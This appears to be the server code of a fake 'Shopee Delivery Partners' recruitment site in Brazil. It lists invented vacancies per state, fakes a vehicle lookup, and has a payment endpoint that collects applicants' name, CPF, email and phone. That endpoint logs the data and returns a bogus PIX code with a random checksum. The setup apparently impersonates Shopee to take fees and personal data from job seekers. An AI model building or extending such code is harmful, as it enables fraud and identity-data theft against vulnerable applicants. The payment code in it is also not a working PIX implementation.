// Servidor completo para Heroku - CommonJS
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const path = require('path');
const fs = require('fs');

// Configuração
const PORT = process.env.PORT || 5000;

// Inicializar o Express
const app = express();

// Middlewares essenciais
app.use(cors({
  origin: true, // Permitir todas as origens em produção
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));

// Lista completa de estados do Brasil
const mockRegions = [
  { name: "Acre", abbr: "AC", vacancies: 4 },
  { name: "Alagoas", abbr: "AL", vacancies: 5 },
  { name: "Amapá", abbr: "AP", vacancies: 3 },
  { name: "Amazonas", abbr: "AM", vacancies: 7 },
  { name: "Bahia", abbr: "BA", vacancies: 10 },
  { name: "Ceará", abbr: "CE", vacancies: 8 },
  { name: "Distrito Federal", abbr: "DF", vacancies: 12 },
  { name: "Espírito Santo", abbr: "ES", vacancies: 6 },
  { name: "Goiás", abbr: "GO", vacancies: 9 },
  { name: "Maranhão", abbr: "MA", vacancies: 5 },
  { name: "Mato Grosso", abbr: "MT", vacancies: 6 },
  { name: "Mato Grosso do Sul", abbr: "MS", vacancies: 5 },
  { name: "Minas Gerais", abbr: "MG", vacancies: 14 },
  { name: "Pará", abbr: "PA", vacancies: 7 },
  { name: "Paraíba", abbr: "PB", vacancies: 5 },
  { name: "Paraná", abbr: "PR", vacancies: 11 },
  { name: "Pernambuco", abbr: "PE", vacancies: 9 },
  { name: "Piauí", abbr: "PI", vacancies: 4 },
  { name: "Rio de Janeiro", abbr: "RJ", vacancies: 18 },
  { name: "Rio Grande do Norte", abbr: "RN", vacancies: 5 },
  { name: "Rio Grande do Sul", abbr: "RS", vacancies: 12 },
  { name: "Rondônia", abbr: "RO", vacancies: 4 },
  { name: "Roraima", abbr: "RR", vacancies: 3 },
  { name: "Santa Catarina", abbr: "SC", vacancies: 10 },
  { name: "São Paulo", abbr: "SP", vacancies: 26 },
  { name: "Sergipe", abbr: "SE", vacancies: 4 },
  { name: "Tocantins", abbr: "TO", vacancies: 4 }
];

// Middleware para log de requisições
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Servir arquivos estáticos do frontend (se existir pasta dist)
const distPath = path.join(__dirname, 'dist');
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath));
  console.log('Servindo arquivos estáticos da pasta dist/');
} else {
  console.log('Pasta dist/ não encontrada. Servindo apenas API.');
}

// Rota de verificação de saúde/status
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    env: process.env.NODE_ENV || 'development',
    port: PORT
  });
});

// Rota de regiões
app.get('/api/regions', (req, res) => {
  res.json(mockRegions);
});

// Simulação da API de consulta de veículos
app.get('/api/vehicle-info/:placa', (req, res) => {
  const { placa } = req.params;
  
  console.log(`Consultando veículo: ${placa}`);
  
  // Simular dados de veículo baseado na placa
  const mockVehicleData = {
    MARCA: "VOLKSWAGEN",
    MODELO: "GOL",
    SUBMODELO: "1.0 MI",
    VERSAO: "CITY",
    ano: "2020",
    anoModelo: "2020",
    chassi: "9BWZZZ377VT004251",
    codigoSituacao: "0",
    cor: "BRANCA"
  };
  
  res.json(mockVehicleData);
});

// Verificação de status de IP
app.get('/api/check-ip-status', (req, res) => {
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
  
  res.json({
    status: 'allowed',
    message: 'IP não está bloqueado',
    ip: clientIp,
    timestamp: new Date().toISOString()
  });
});

// Configuração para pagamentos
app.post('/api/payments/create-pix', (req, res) => {
  const { name, cpf, email, phone, amount } = req.body;
  
  console.log('Recebido pedido de pagamento:', { name, cpf, email, phone, amount });
  
  // Verificação básica de dados
  if (!name || !cpf || !amount) {
    return res.status(400).json({ error: 'Dados incompletos' });
  }
  
  // Gerar ID único para o pagamento
  const paymentId = `pix_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
  
  // Criar código PIX e QR code para pagamento
  const pixCode = `00020126580014BR.GOV.BCB.PIX0136${cpf}5204000053039865802BR5913Shopee${name}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
  const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
  
  // Resposta da API com os dados do pagamento
  const pixResponse = {
    id: paymentId,
    pixCode: pixCode,
    pixQrCode: pixQrCode,
    status: 'pending'
  };
  
  // Log da resposta
  console.log('Enviando resposta de pagamento:', pixResponse);
  
  // Enviar resposta
  res.json(pixResponse);
});

// Middleware para tratar rotas não encontradas da API
app.use('/api/*', (req, res) => {
  res.status(404).json({
    error: 'API endpoint not found',
    path: req.originalUrl
  });
});

// Para rotas do frontend, servir o index.html (SPA routing)
app.get('*', (req, res) => {
  const indexPath = path.join(distPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    // Se não tiver build, mostrar página de loading HTML
    res.type('html').send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Shopee Delivery Partners</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #E83D22 0%, #FF6B4A 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .container {
                background: white;
                padding: 3rem;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
                text-align: center;
                max-width: 500px;
                width: 90%;
            }
            .logo {
                width: 80px;
                height: 80px;
                margin: 0 auto 2rem;
            }
            h1 {
                color: #E83D22;
                font-size: 2.2rem;
                margin-bottom: 1rem;
                font-weight: 700;
            }
            p {
                color: #666;
                font-size: 1.1rem;
                margin-bottom: 2rem;
                line-height: 1.6;
            }
            .status {
                background: #f8f9fa;
                padding: 1.5rem;
                border-radius: 12px;
                border-left: 4px solid #E83D22;
                margin: 2rem 0;
            }
            .loading {
                display: inline-block;
                width: 20px;
                height: 20px;
                border: 3px solid #f3f3f3;
                border-top: 3px solid #E83D22;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin-right: 10px;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .api-status {
                background: #e8f5e8;
                border-left: 4px solid #28a745;
                padding: 1rem;
                border-radius: 8px;
                margin-top: 1rem;
                text-align: left;
            }
            .api-endpoint {
                font-family: monospace;
                background: #f8f9fa;
                padding: 0.3rem 0.6rem;
                border-radius: 4px;
                margin: 0.2rem 0;
                font-size: 0.9rem;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="50" cy="50" r="50" fill="#E83D22"/>
                    <path d="M30 35h40v30H30z" fill="white"/>
                    <circle cx="40" cy="55" r="8" fill="#E83D22"/>
                    <circle cx="60" cy="55" r="8" fill="#E83D22"/>
                </svg>
            </div>
            
            <h1>Shopee Delivery Partners</h1>
            <p>Sistema de recrutamento para parceiros de entrega</p>
            
            <div class="status">
                <div class="loading"></div>
                <strong>API funcionando!</strong>
                <br><small>Frontend será carregado após o build</small>
            </div>
            
            <div class="api-status">
                <strong>✅ APIs Disponíveis:</strong>
                <div class="api-endpoint">GET /api/regions</div>
                <div class="api-endpoint">GET /api/vehicle-info/:placa</div>
                <div class="api-endpoint">POST /api/payments/create-pix</div>
                <div class="api-endpoint">GET /health</div>
            </div>
        </div>
    </body>
    </html>
    `);
  }
});

// Iniciar o servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Servidor Shopee Delivery Partners rodando na porta ${PORT}`);
  console.log(`Ambiente: ${process.env.NODE_ENV || 'development'}`);
  console.log(`Servindo frontend e backend integrados`);
});